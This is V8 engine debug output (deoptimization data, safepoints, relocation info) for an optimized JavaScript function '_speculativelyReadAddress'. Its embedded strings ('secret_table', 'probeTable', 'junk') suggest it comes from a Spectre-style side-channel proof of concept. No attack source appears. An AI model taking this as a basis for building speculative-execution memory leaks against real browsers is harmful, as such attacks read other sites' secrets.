                               INTERPRETED_FRAME {bytecode_offset=229, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
    34               44    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=44, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
                               REGISTER {input=r9}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    35               49   4c2  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=49, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
    36               85   4f6  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=85, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
    37               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
    38               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
    39               85   5cd  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=85, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=23}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
    40               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=23}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
    41               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=23}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
    42              172   717  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               INT32_STACK_SLOT {input=20}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               STACK_SLOT {input=22}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=23}
    43              159   753  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=159, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=20}
                               INT32_STACK_SLOT {input=21}
                               STACK_SLOT {input=22}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=23}
    44              124   79d  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=124, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=20}
                               INT32_STACK_SLOT {input=21}
                               INT32_STACK_SLOT {input=22}
                               STACK_SLOT {input=23}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=24}
    45              111   7d9  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=111, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               INT32_STACK_SLOT {input=22}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=23}
    46               98   80e  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=98, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=22}
    47               75   835  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=75, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=20}
    48               57   85c  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=57, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=4 (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=20}
    49               42   883  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=42, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=13}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}

Safepoints (size = 224)
0x622d186cdf9      d9   898  0000000001100010000000000000 (sp -> fp)       4
0x622d186d1e2     4c2   933  0000000011100010000000000000 (sp -> fp)      35
0x622d186d216     4f6   938  0000000111100010000000000000 (sp -> fp)      36
0x622d186d2ed     5cd   947  0010000011100010000000000000 (sp -> fp)      39
0x622d186d437     717   956  0000010011100010000000000000 (sp -> fp)      42
0x622d186d473     753   95b  0000110011100010000000000000 (sp -> fp)      43
0x622d186d4bd     79d   960  0001100011100010000000000000 (sp -> fp)      44
0x622d186d4f9     7d9   965  0000100111100010000000000000 (sp -> fp)      45
0x622d186d52e     80e   96a  0000010111100010000000000000 (sp -> fp)      46
0x622d186d555     835   96f  0000000111100010000000000000 (sp -> fp)      47
0x622d186d57c     85c   974  0000000101100010000000000000 (sp -> fp)      48
0x622d186d5a3     883   979  0000000011100010000000000000 (sp -> fp)      49

RelocInfo (size = 2654)
0x622d186cd20  comment  (-- <not inlined:330> --)
0x622d186cd20  comment  (-- Prologue: check for deoptimization --)
0x622d186cd2a  code target (BUILTIN CompileLazyDeoptimizedCode)  (0x622d178ef20)
0x622d186cd2e  comment  (-- B0 start (construct frame) --)
0x622d186cd3f  code target (BUILTIN Abort)  (0x622d179d880)
0x622d186cd44  comment  (-- OSR entrypoint --)
0x622d186cd60  comment  (-- B1 start (loop up to 53) --)
0x622d186cd60  comment  (-- <not inlined:817> --)
0x622d186cd64  comment  (-- <not inlined:819> --)
0x622d186cd6e  comment  (-- B2 start (in loop 1) --)
0x622d186cd6e  comment  (-- <not inlined:817> --)
0x622d186cd90  comment  (-- B3 start (in loop 1) --)
0x622d186cd90  comment  (-- <not inlined:799> --)
0x622d186cd9d  comment  (-- B5 start (in loop 1) --)
0x622d186cd9d  comment  (-- B6 start (in loop 1) --)
0x622d186cd9d  comment  (-- <not inlined:879> --)
0x622d186cda1  comment  (-- <not inlined:898> --)
0x622d186cdab  comment  (-- B7 start (in loop 1) --)
0x622d186cdab  comment  (-- <not inlined:896> --)
0x622d186cdc3  comment  (-- <not inlined:879> --)
0x622d186cdd6  embedded object  (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)
0x622d186cdf5  code target (BUILTIN CreateTypedArray)  (0x622d17cb960)
0x622d186cdf9  comment  (-- <not inlined:931> --)
0x622d186ce12  comment  (-- B8 start (in loop 1) --)
0x622d186ce12  comment  (-- <not inlined:950> --)
0x622d186ce25  comment  (-- B9 start (in loop 1) --)
0x622d186ce2e  comment  (-- B10 start (in loop 1) --)
0x622d186ce2e  comment  (-- <not inlined:918> --)
0x622d186ce3b  comment  (-- B12 start (in loop 1) --)
0x622d186ce3b  comment  (-- B13 start (in loop 1) --)
0x622d186ce3b  comment  (-- <not inlined:1103> --)
0x622d186ce3f  comment  (-- <not inlined:1058> --)
0x622d186ce54  comment  (-- <not inlined:1103> --)
0x622d186ce5e  comment  (-- B14 start (in loop 1) --)
0x622d186ce5e  comment  (-- <not inlined:1111> --)
0x622d186ce87  comment  (-- B15 start (in loop 1) --)
0x622d186ce87  comment  (-- B17 start (in loop 1) --)
0x622d186ce87  comment  (-- <not inlined:1165> --)
0x622d186ce95  comment  (-- B18 start (in loop 1) --)
0x622d186ce95  comment  (-- <not inlined:1175> --)
0x622d186cecb  comment  (-- B19 start (in loop 1) --)
0x622d186cecb  comment  (-- B21 start (in loop 1) --)
0x622d186cecb  comment  (-- <not inlined:1314> --)
0x622d186ced9  comment  (-- B22 start (in loop 1) --)
0x622d186ced9  comment  (-- <not inlined:1336> --)
0x622d186cef3  comment  (-- <not inlined:1319> --)
0x622d186cefe  comment  (-- <not inlined:1461> --)
0x622d186cf00  embedded object  (0x08c012604781 <Map(UINT8_ELEMENTS)>)
0x622d186cf48  comment  (-- B23 start (in loop 1) --)
0x622d186cf48  comment  (-- B24 start (in loop 1) --)
0x622d186cf48  comment  (-- <not inlined:1483> --)
0x622d186cf51  comment  (-- B25 start (in loop 1) --)
0x622d186cf5a  comment  (-- B26 start (in loop 1) --)
0x622d186cf5a  comment  (-- B27 start (in loop 1) --)
0x622d186cf5a  comment  (-- <not inlined:1538> --)
0x622d186cf68  comment  (-- B28 start (in loop 1) --)
0x622d186cf68  comment  (-- <not inlined:1550> --)
0x622d186cf99  comment  (-- <not inlined:1723> --)
0x622d186cfa3  comment  (-- B29 start (in loop 1) --)
0x622d186cfa3  comment  (-- <not inlined:1746> --)
0x622d186cfa6  comment  (-- <not inlined:1762> --)
0x622d186cfb0  comment  (-- <not inlined:1742> --)
0x622d186cfd4  comment  (-- <not inlined:1780> --)
0x622d186cfda  comment  (-- <not inlined:1742> --)
0x622d186cfef  comment  (-- <not inlined:1728> --)
0x622d186cff7  comment  (-- B30 start (in loop 1) --)
0x622d186cff7  comment  (-- <not inlined:957> --)
0x622d186d010  comment  (-- B31 start (loop up to 51) (in loop 1) --)
0x622d186d010  comment  (-- <not inlined:950> --)
0x622d186d019  comment  (-- B32 start (in loop 31) --)
0x622d186d019  comment  (-- <not inlined:918> --)
0x622d186d026  comment  (-- B34 start (in loop 31) --)
0x622d186d026  comment  (-- B35 start (in loop 31) --)
0x622d186d026  comment  (-- <not inlined:1058> --)
0x622d186d031  comment  (-- <not inlined:1111> --)
0x622d186d051  comment  (-- B36 start (in loop 31) --)
0x622d186d051  comment  (-- B38 start (in loop 31) --)
0x622d186d051  comment  (-- <not inlined:1175> --)
0x622d186d06c  comment  (-- B39 start (in loop 31) --)
0x622d186d06c  comment  (-- B41 start (in loop 31) --)
0x622d186d06c  comment  (-- <not inlined:1314> --)
0x622d186d07a  comment  (-- B42 start (in loop 31) --)
0x622d186d07a  comment  (-- <not inlined:1336> --)
0x622d186d08a  comment  (-- <not inlined:1723> --)
0x622d186d091  comment  (-- <not inlined:1336> --)
0x622d186d09b  comment  (-- <not inlined:1319> --)
0x622d186d09f  comment  (-- <not inlined:1461> --)
0x622d186d0bb  comment  (-- B43 start (in loop 31) --)
0x622d186d0bb  comment  (-- B44 start (in loop 31) --)
0x622d186d0bb  comment  (-- <not inlined:1483> --)
0x622d186d0c4  comment  (-- B45 start (in loop 31) --)
0x622d186d0c4  comment  (-- B46 start (in loop 31) --)
0x622d186d0c4  comment  (-- B47 start (in loop 31) --)
0x622d186d0c4  comment  (-- <not inlined:1538> --)
0x622d186d0d2  comment  (-- B48 start (in loop 31) --)
0x622d186d0d2  comment  (-- <not inlined:1550> --)
0x622d186d103  comment  (-- <not inlined:1723> --)
0x622d186d10d  comment  (-- B49 start (in loop 31) --)
0x622d186d10d  comment  (-- <not inlined:1746> --)
0x622d186d110  comment  (-- <not inlined:1762> --)
0x622d186d11a  comment  (-- <not inlined:1742> --)
0x622d186d13a  comment  (-- <not inlined:1780> --)
0x622d186d13f  comment  (-- <not inlined:1742> --)
0x622d186d154  comment  (-- <not inlined:1728> --)
0x622d186d15c  comment  (-- B50 start (in loop 31) --)
0x622d186d15c  comment  (-- <not inlined:957> --)
0x622d186d177  comment  (-- B51 start (in loop 1) --)
0x622d186d177  comment  (-- B52 start (in loop 1) --)
0x622d186d177  comment  (-- <not inlined:846> --)
0x622d186d18b  comment  (-- <not inlined:817> --)
0x622d186d1a1  comment  (-- B53 start (deconstruct frame) --)
0x622d186d1a1  comment  (-- <not inlined:1846> --)
0x622d186d1a9  embedded object  (0x36973b29d919 <JSFunction probeTable (sfi = 0x2c2783f96121)>)
0x622d186d1bb  comment  (-- <not inlined:1871> --)
0x622d186d1c6  comment  (-- B68 start (no frame) --)
0x622d186d1c6  comment  (-- B4 start (deferred) (in loop 1) --)
0x622d186d1c6  comment  (-- <not inlined:799> --)
0x622d186d1de  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186d1fd  comment  (-- B11 start (deferred) (in loop 1) --)
0x622d186d1fd  comment  (-- <not inlined:918> --)
0x622d186d212  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186d22d  comment  (-- B16 start (deferred) (in loop 1) --)
0x622d186d22d  comment  (-- <not inlined:1111> --)
0x622d186d27d  comment  (-- B20 start (deferred) (in loop 1) --)
0x622d186d27d  comment  (-- <not inlined:1175> --)
0x622d186d2d4  comment  (-- B33 start (deferred) (in loop 31) --)
0x622d186d2d4  comment  (-- <not inlined:918> --)
0x622d186d2e9  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186d30c  embedded object  (0x08c012604781 <Map(UINT8_ELEMENTS)>)
0x622d186d319  comment  (-- B37 start (deferred) (in loop 31) --)
0x622d186d319  comment  (-- <not inlined:1111> --)
0x622d186d34a  embedded object  (0x08c012604781 <Map(UINT8_ELEMENTS)>)
0x622d186d35e  comment  (-- B40 start (deferred) (in loop 31) --)
0x622d186d35e  comment  (-- <not inlined:1175> --)
0x622d186d38f  embedded object  (0x08c012604781 <Map(UINT8_ELEMENTS)>)
0x622d186d3a3  comment  (-- B54 start (deferred) --)
0x622d186d3b6  comment  (-- B55 start (deferred) --)
0x622d186d3d0  comment  (-- B56 start (deferred) --)
0x622d186d3d0  comment  (-- <not inlined:1314> --)
0x622d186d3f8  comment  (-- B57 start (deferred) --)
0x622d186d3ff  comment  (-- B58 start (deferred) --)
0x622d186d401  embedded object  (0x2c2783f95c31 <String[4]: junk>)
0x622d186d40a  comment  (-- <not inlined:1723> --)
0x622d186d433  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186d437  comment  (-- B59 start (deferred) --)
0x622d186d445  comment  (-- B60 start (deferred) --)
0x622d186d447  embedded object  (0x2c2783f95d31 <String[12]: secret_table>)
0x622d186d450  comment  (-- <not inlined:1538> --)
0x622d186d46f  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186d473  comment  (-- B61 start (deferred) --)
0x622d186d48f  comment  (-- B62 start (deferred) --)
0x622d186d491  embedded object  (0x2c2783f95c31 <String[4]: junk>)
0x622d186d49a  comment  (-- <not inlined:1314> --)
0x622d186d4b9  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186d4bd  comment  (-- B63 start (deferred) --)
0x622d186d4bf  embedded object  (0x2c2783f95ca9 <String[9]: page_size>)
0x622d186d4c8  comment  (-- <not inlined:1165> --)
0x622d186d4f5  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186d4f9  comment  (-- B64 start (deferred) --)
0x622d186d4fb  embedded object  (0x3b2a3bd02541 <String[7]: address>)
0x622d186d504  comment  (-- <not inlined:1103> --)
0x622d186d52a  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
